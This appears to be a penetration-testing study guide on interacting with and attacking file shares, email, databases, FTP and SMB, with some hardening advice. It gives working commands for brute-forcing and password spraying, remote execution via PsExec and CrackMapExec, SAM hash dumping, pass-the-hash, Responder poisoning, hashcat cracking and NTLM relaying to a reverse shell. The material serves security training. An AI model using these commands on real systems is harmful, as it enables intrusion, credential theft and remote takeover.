# Interacting with Common Services
To be successful in this field, we must understand how to interact with common services, like file sharing protocols (e.g., SMB, NFS, FTP). This guide focuses on interacting with file shares, both internal and cloud-based.

## File Share Services  
File sharing services, including SMB, FTP, and cloud storage, allow file transfers. This section focuses on internal services, often with cloud syncing to local machines.

## SMB (Server Message Block)  
SMB is widely used for file sharing in Windows networks. Understanding how to interact with SMB shares is key.

## Windows - GUI Access  
- Open Run (WINKEY + R) and type
  ```
  \IP\Share
  ```  
- If the share allows anonymous access or valid credentials, the folder is displayed. Else, an authentication prompt appears.

### Windows CMD  
- **List contents**:  
  ```
  dir \IP\Share\
  ```  
- **Map drive**:  
  ```
  net use N: \IP\Share\
  ```  
- **Authenticate with credentials**:  
  ```
  net use N: \IP\Share\ /user:username password
  ```  
- **Count files**:  
  ```
  dir N: /a-d /s /b | find /c ":\"
  ```  
- **Search for files**:
  Search files with regex cred in their names.
  ```
  dir N:\*cred* /s /b
  ```
  Search files with regex cred in the file content.
  ```
  findstr /s /i cred N:\*.*
  ```
  ### PowerShell
  PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called cmdlets. Cmdlets are similar to Windows commands but provide a more extensible scripting language.
- **List contents**:  
  ```
  Get-ChildItem \IP\Share\
  ```  
- **Map drive**:  
  ```
  New-PSDrive -Name "N" -Root \IP\Share\ -PSProvider "FileSystem"
  ```  
- **Authenticate with credentials**:  
  ```  
  $secpassword = ConvertTo-SecureString "password" -AsPlainText -Force  
  $cred = New-Object System.Management.Automation.PSCredential "username", $secpassword  
  New-PSDrive -Name "N" -Root \IP\Share\ -PSProvider "FileSystem" -Credential $cred  
  ```  
- **Count files**:  
  ```
  (Get-ChildItem -File -Recurse | Measure-Object).Count
  ```  
- **Search for files**:  
  ```
  Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
  ```  
  ```
  Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
  ```

CLI tools (CMD and PowerShell) enable quick and automated file share interactions.

### Linux
Linux (UNIX) machines can also be used to browse and mount SMB shares. 
- **Linux - Mount**
   ```
   sudo mkdir /mnt/Finance
   sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
   ```
   or have cred file to authenticate with cifs
  ```
  mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
  ```
  ![image](https://github.com/user-attachments/assets/c75329b4-a18e-4322-8194-d1ff08244734)

  Install Cifs before hand
  ```
  sudo apt install cifs-utils.
  ```
- **Linux - Find**
  ```
  find /mnt/Finance/ -name *cred*
  ```
  ```
   grep -rn /mnt/Finance/ -ie cred
   ```
## Other Services
Other services such as FTP, TFTP, and NFS that we can attach (mount) using different tools and commands.
### Email
We typically need two protocols to send and receive messages, one for sending and another for receiving. The Simple Mail Transfer Protocol (SMTP) is an email delivery protocol used to send mail over the internet. Likewise, a supporting protocol must be used to retrieve an email from a service. There are two main protocols we can use POP3 and IMAP.
We can use a mail client such as Evolution, the official personal information manager, and mail client for the GNOME Desktop Environment. 

-**Linux - Install Evolution**
```
sudo apt-get install evolution
```
Note: If an error appears when starting evolution indicating "bwrap: Can't create file at ...", use this command to start evolution export WEBKIT_FORCE_SANDBOX=0 && evolution.

- **Video - Connecting to IMAP and SMTP using Evolution**
https://www.youtube.com/watch?v=xelO2CiaSVs
If the server uses SMTPS or IMAPS, we'll need the appropriate encryption method (TLS on a dedicated port or STARTTLS after connecting). We can use the Check for Supported Types option under authentication to confirm if the server supports our selected method.

## Databases
Databases are typically used in enterprises, and most companies use them to store and manage information. There are Hierarchical databases, NoSQL (or non-relational) databases, and SQL relational databases. 
We have three common ways to interact with databases:

1.	Command Line Utilities (mysql or sqsh)
2.	A GUI application to interact with databases such as HeidiSQL, MySQL Workbench, or SQL Server Management Studio.
3.	Programming Languages

###  Command Line Utilities

#### MSSQL
MSSQL (Microsoft SQL Server) with Linux we can use sqsh or sqlcmd if you are using Windows. **sqsh** is much more than a friendly prompt. It is intended to provide much of the functionality provided by a command shell, such as variables, aliasing, redirection, pipes, back-grounding, job control, history, command substitution, and dynamic configuration. 

**Linux - SQSH**
```
sqsh -S 10.129.20.13 -U username -P Password123
```
**Windows - SQLCMD**
The sqlcmd utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:

At the command prompt.
In Query Editor in SQLCMD mode.
In a Windows script file.
In an operating system (Cmd.exe) job step of a SQL Server Agent job.

```
sqlcmd -S 10.129.20.13 -U username -P Password123
```
#### MySQL
use MySQL binaries for Linux (mysql) or Windows (mysql.exe). 

**Linux - MySQL**
```
mysql -u username -pPassword123 -h 10.129.20.13
```
**Windows - MySQL**
```
mysql.exe -u username -pPassword123 -h 10.129.20.13
```
### GUI Application
Gui tools provided by database engines can be used to interact with the databases. MySQL Workbench and MSSQL has SQL Server Management Studio or SSMS ( for windows ).  [dbeaver](https://dbeaver.com) is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others.
- **Install dbeaver**
  ```
  sudo dpkg -i dbeaver-<version>.deb
  ```
- **Run dbeaver**
  ```
  dbeaver &
  ```
  To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).
- **Video - Connecting to MSSQL DB using dbeaver**
  https://www.youtube.com/watch?v=gU6iQP5rFMw
- **Video - Connecting to MySQL DB using dbeaver**
  https://academy.hackthebox.com/module/116/section/1140

  use common Transact-SQL statements to enumerate databases and tables containing sensitive information such as usernames and passwords.
## Tools
It is crucial to get familiar with the default command-line utilities available to interact with different services. If there is no tool for our needs check the community for more tools or create one and fill the gap.
![image](https://github.com/user-attachments/assets/5b457a2c-8048-4f8a-abd9-959c4cc8bfc3)
## General Troubleshooting
Depending on the Windows or Linux version we are working with or targetting, we may encounter different problems when attempting to connect to a service.

Some reasons why we may not have access to a resource:

- Authentication
- Privileges
- Network Connection
- Firewall Rules
- Protocol Support

# The Concept of Attacks

To effectively understand how different services can be attacked, it’s essential to develop a structured concept that categorizes potential attack points and highlights commonalities across various services. Just as the concept of building a house involves common elements like a foundation, walls, and a roof, the concept of attacking services requires a foundational understanding that can be adapted and expanded as needed.

## Categorizing the Concept of Attacks

Attacks on services can be conceptualized using a pattern template that includes four primary categories:

1. **Source**
2. **Process**
3. **Privileges**
4. **Destination**

Each of these categories encompasses specific characteristics and functions that can be adapted to individual services, such as SSH, FTP, SMB, and HTTP. This template provides a structured way to identify and understand vulnerabilities.

### 1. Source
The Source refers to where the input or information originates. It is the initial entry point for data that will be processed, potentially exploited for vulnerabilities. Common types of Sources include:

- **Code**: Results from program code that may pass information internally between functions.
- **Libraries**: Collections of prebuilt code and resources that programs utilize.
- **Configurations (Config)**: Preset values that define how a process operates.
- **APIs**: Interfaces for data retrieval and manipulation.
- **User Input**: Direct input from users that can be manipulated to exploit vulnerabilities.

**Example – Log4j (CVE-2021-44228)**  
In the Log4j vulnerability, attackers manipulated the HTTP User-Agent header by injecting a Java Naming and Directory Interface (JNDI) lookup command. This command was processed by the Log4j library instead of logging the string as expected, leading to remote code execution.

### 2. Process
The Process is where the received information is handled. It determines how input is processed, how variables are used, and how functions are executed.

**Components of Processes**:
- **PID (Process ID)**: Identifies specific processes.
- **Input**: The data provided to the process, either by user interaction or preprogrammed functions.
- **Data Processing**: The method through which data is handled and transformed.
- **Variables**: Placeholders for data during the processing.
- **Logging**: Recording of events or data points, often retained in files or registers.

**Example – Log4j**  
In the case of Log4j, the process was designed to log input strings, but due to a misinterpretation of the User-Agent header as executable code, the vulnerability allowed for a request to be executed instead of merely logged.

### 3. Privileges
Privileges control what a process can do within a system. They act as a permission set that dictates the extent of actions available to processes.

**Types of Privileges**:
- **System**: Highest-level permissions (e.g., ‘SYSTEM’ on Windows, ‘root’ on Linux).
- **User**: Permissions assigned to individual users.
- **Groups**: Shared permissions assigned to collections of users.
- **Policies**: Rules that dictate what commands or actions users/groups can execute.
- **Rules**: Application-specific permissions that determine which actions are permissible.

**Example – Log4j**  
The danger of the Log4j vulnerability was exacerbated by the elevated privileges often granted to logging processes. This allowed attackers to execute remote code with potentially high levels of access.

### 4. Destination
The Destination is the end goal of the process—whether that means computing data, transferring it, or storing it. Not all Destinations become new Sources; therefore, this stage is not always recursive.

## Pattern Templates for Services
Creating a pattern template for analyzing potential attack vectors involves:

- Identifying the **Source** of input.
- Understanding the **Process** that handles it.
- Evaluating the **Privileges** under which the process runs.
- Recognizing the **Destination** or intended outcome.

By applying this structured approach, it becomes easier to pinpoint vulnerabilities across various services and implement defensive measures efficiently.

Here's a straightforward summary of service misconfigurations:

# Service Misconfigurations
Service misconfigurations occur when systems are not set up securely, creating vulnerabilities for unauthorized access.

## Common Types of Misconfigurations

1. **Authentication Issues**
   - **Default Credentials**: Some services come with default login details (e.g., `admin:admin`, `root:12345678`). These should be changed during setup.
   - **Weak/No Passwords**: Administrators sometimes use weak or no passwords temporarily, which is risky.
   - **Tip**: Apply strict password policies to prevent simple combinations.

2. **Anonymous Authentication**
   - Services allowing anonymous access permit anyone to connect without credentials. Ensure proper authentication settings are enabled.

3. **Misconfigured Access Rights**
   - Users might have more permissions than necessary, such as read access when only upload rights are needed. This could expose sensitive information.
   - **Solution**: Use Role-Based Access Control (RBAC) or Access Control Lists (ACL) to manage permissions.

4. **Unnecessary Defaults**
   - Initial configurations prioritize usability over security (e.g., open ports, default accounts, verbose error messages).
   - **Best Practice**: Change default settings, disable unnecessary features, and secure administrative interfaces.

## Preventing Misconfigurations
- **Secure Critical Infrastructure**: Limit access and disable unneeded functionalities.
- **Avoid Default Settings**: Disable default credentials, debugging, and unsecured admin interfaces.
- **Implement Secure Installation Practices**:
  - Use a consistent, automated hardening process.
  - Keep configurations similar across development, QA, and production environments but with unique credentials.
- **Reduce Attack Surface**: Remove unused components, use segmentation, and apply security headers.
- **Regular Audits**: Perform scans and reviews to identify and fix potential misconfigurations.

## Key OWASP Recommendations
- Use minimal, secure platforms without extra components.
- Update configurations regularly and apply patches.
- Check and secure cloud storage permissions and use automated verification tools.

**Consistent configuration updates and monitoring are crucial to mitigate misconfiguration risks.**

# Finding Sensitive Information
When attacking a service, we act as detectives, gathering as much information as possible and observing details carefully. Every piece of information is crucial.

Imagine an engagement scenario: we target email, FTP, databases, and storage, aiming for Remote Code Execution (RCE). During enumeration, we find that only the FTP service allows anonymous access. Although it seems empty, there is a file named `johnsmith`. Using `johnsmith` as the FTP user and password fails, but we try it on the email service and successfully log in. Searching emails for the keyword "password," we find several matches, including John's MSSQL database credentials. We use these to access the database, execute commands, and achieve RCE, meeting our goal.

A misconfigured service revealed a piece of information—`johnsmith`—that appeared insignificant but led to RCE. This demonstrates the importance of paying attention to every detail during enumeration and service attacks.

## Examples of Sensitive Information:
- Usernames
- Email Addresses
- Passwords
- DNS Records
- IP Addresses
- Source Code
- Configuration Files
- PII (Personally Identifiable Information)

## Common Services to Explore:
- File Shares
- Email
- Databases

### Understanding What to Look for
Each target is unique, so it’s essential to understand the target’s processes, procedures, business model, and purpose. This insight helps identify valuable information for attacks.

## Key Elements for Finding Sensitive Information:
1. Understand the service and its functionality.
2. Know what information to search for.

# Attacking FTP

## FTP Overview
- **Port**: FTP typically runs on **TCP/21**.
- **Functionality**: Transfers files between client and server, allowing directory operations (e.g., `ls`, `cd`, `put`, `get`).
- **Authentication**:
  - **Anonymous login**: Allows access without credentials (risky if permissions are not set properly).
  - **User login**: Requires valid credentials.
- **File Management**: FTP provides a hierarchical directory structure where users can store, move, and manipulate files.

## Enumeration
- **Nmap**: 
  - `-sC` and `-sV` for default scripts and version enumeration.
  - `ftp-anon` script checks if anonymous login is allowed.
  - `-p 21` specifies FTP port.
  
  **Example**:
  ```bash
  sudo nmap -sC -sV -p 21 192.168.2.142
  ```

### Misconfigurations
- **Anonymous Login**: Exploitable if permissions are not restricted.
- **Accessing Files**: Use FTP commands (`ls`, `cd`, `get`, `put`) to interact with files and directories.
  Example:
  ```bash
  ftp 192.168.2.142
  ```
## Protocol Specifics Attacks
Many different attacks and methods are protocol-based. However, it is essential to note that we are not attacking the individual protocols themselves but the services that use them. Since there are dozens of services for a single protocol and they process the corresponding information differently, we will look at some.
### Brute Forcing
- **Medusa**: Use for brute-force FTP login with a wordlist.
  Example:
  ```bash
  medusa -u user -P /path/to/rockyou.txt -h 192.168.2.142 -M ftp
  ```

### FTP Bounce Attack
- **Definition**: An FTP Bounce attack allows an attacker to use a vulnerable FTP server as a proxy to deliver traffic to other devices within the network, bypassing firewalls.
- **How it works**: The attacker uses the FTP server's **PORT command** to tell the server to send data to an external target, effectively performing port scanning or other actions on a machine behind the FTP server.
- **Targeting**: This attack is particularly useful when the attacker cannot directly reach a target machine due to network restrictions.
- **Mitigation**: Modern FTP servers typically disable this feature, but if misconfigured, it can still be exploited.
  
  **Example with Nmap**:
  ```bash
  nmap -Pn -v -n -p80 -b anonymous:password@ftp_server_ip target_ip
  ```

### Conclusion
- FTP can be vulnerable if misconfigured or exploited through brute-force, anonymous login, or FTP bounce attacks. Understanding how to interact with the FTP service and identifying misconfigurations can lead to successful exploitation.

# Attacking SMB
Server Message Block (SMB) is a protocol for network file and printer sharing, initially running on NetBIOS over TCP/IP but now able to run directly on TCP/IP using port 445. Samba is the open-source implementation of SMB for Unix/Linux systems, allowing interoperability with Windows clients. To attack an SMB server, one must understand its implementation and configuration, exploit known vulnerabilities, and be cautious of the content in shared directories, including how NetBIOS and RPC might be leveraged.

## Enumeration
```
sudo nmap 10.129.14.128 -sV -sC -p139,445
```
The Nmap scan reveals essential information about the target:

SMB version (Samba smbd 4.6.2)
Hostname HTB
Operating System is Linux based on SMB implementation

## Misconfigurations
SMB can be configured not to require authentication, which is often called a null session. Instead, we can log in to a system with no username or password.
### Anonymous Authentication
If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc.
### File Share 
```
smbclient -N -L //10.129.14.128
```
Smbmap is another tool that helps us enumerate network shares and access associated permissions. An advantage of smbmap is that it provides a list of permissions for each shared folder.
```
smbmap -H 10.129.14.128
```
Using smbmap with the -r or -R (recursive) option, one can browse the directories:
```
smbmap -H 10.129.14.128 -r notes
```
the permissions are set to READ and WRITE, which one can use to upload and download the files.
```
smbmap -H 10.129.14.128 --download "notes\note.txt"
```
Upload
```
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
### Remote Procedure Call (RPC)

The rpcclient tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. 

```
rpcclient -U'%' 10.10.110.17
```
```
enumdomusers
```
Enum4linux is another utility that supports null sessions, and it utilizes nmblookup, net, rpcclient, and smbclient to automate some common enumeration from SMB targets such as:
Workgroup/Domain name, Users information, Operating system information, Groups information, Shares Folders, Password policy information.

```
./enum4linux-ng.py 10.10.11.45 -A -C
```
## Protocol Specifics Attacks
If no null session try the bellow methods
### Brute Forcing and Password Spray
When brute-forcing, we try as many passwords as possible against an account, but it can lock out an account if we hit the threshold. 

Password spraying is a better alternative since we can target a list of usernames with one common password to avoid account lockouts. We can try more than one password if we know the account lockout threshold. Typically, two to three attempts are safe, provided we wait 30-60 minutes between attempts.

```
cat /tmp/userlist.txt
```
```
Administrator
jrodriguez 
admin
<SNIP>
jurena
```

**Use NetExec for password spraying**
```
netexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
Additionally, if we are targetting a non-domain joined computer, we will need to use the option --local-auth. 

### SMB 
#### Linux SMB Servers:
- **Access**: Typically limited to file system access, privilege abuse, or known vulnerability exploitation.
  
#### Windows SMB Servers:
- **Attack Surface**: Larger than Linux.
- **Actions Based on User Privileges**:
  - Remote Command Execution (RCE)
  - Extracting Hashes from the SAM Database
  - Enumerating Logged-on Users
  - Pass-the-Hash (PTH) attacks

#### Remote Code Execution (RCE) with PsExec:
- **Sysinternals**: Developed for managing and troubleshooting Windows environments; includes PsExec.
- **PsExec**: Enables remote command execution by deploying a service to the admin$ share, utilizing the DCE/RPC interface over SMB.

#### PsExec Implementations:
- **Impacket PsExec**: Python-based, using RemComSvc.
- **Impacket SMBExec**: Avoids RemComSvc, uses a local SMB server.
- **Impacket atexec**: Uses Task Scheduler for command execution.
- **CrackMapExec**: Includes smbexec and atexec.
- **Metasploit PsExec**: Ruby-based implementation.

#### Impacket PsExec
Requires domain/username, password, and target IP address.

```
impacket-psexec -h
```
To connect to a remote machine with a local administrator account, using impacket-psexec
```
impacket-psexec administrator:'Password123!'@10.10.110.17
```
#### CrackMapExec
Another tool we can use to run CMD or PowerShell is CrackMapExec. One advantage of CrackMapExec is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, smb, the IP address or IP address range, the option -u for username, and -p for the password, and the option -x to run cmd commands or uppercase -X to run PowerShell commands.

```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
#### Enumerating Logged-on Users
CrackMapExec to enumerate logged-on users on all machines within the same network 10.10.110.17/24, which speeds up our enumeration process.
```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
#### Extract Hashes from SAM Database
The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:

Authenticate as another user.
Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
Pass The Hash.
```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

#### Pass-the-Hash (PtH)
If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). 
```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
### Forced Authentication Attacks

#### Using Fake SMB Server:
- **Purpose**: Capture users' NetNTLM v1/v2 hashes by creating a fake SMB server.
- **Common Tool**: Responder, an LLMNR, NBT-NS, and MDNS poisoner tool.

#### Responder Functionality:
- **Setup Command**:
  ```
  responder -I <interface name>
  ```
- **Default Behavior**: Finds LLMNR and NBT-NS traffic, responds on behalf of the servers the victim is looking for, and captures their NetNTLM hashes.

#### Example Scenario:
1. **Name Resolution Process**:
   - Check local host file.
   - Check local DNS cache.
   - Query DNS server.
   - Multicast query if no results.
2. **Attack Scenario**:
   - A user mistypes a shared folder name.
   - All name resolutions fail, leading to a multicast query.
   - The attacker's fake SMB server responds to this query, capturing the user's credentials.

#### Setup Example:
- **Command**:
  ```
  sudo responder -I ens33
  ```
These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user.

All saved Hashes are located in Responder's logs directory (/usr/share/responder/logs/). 

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
The NTLMv2 hash was cracked. The password is P@ssword. If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. 

First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).

```
 cat /etc/responder/Responder.conf | grep 'SMB ='
```
Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.
```
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'revshell command from revshells.com'
```
Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

```
 nc -lvnp 9001
```
### RPC
use RPC to make changes to the system, such as:

Change a user's password, Create a new domain user, Create a new shared folder.
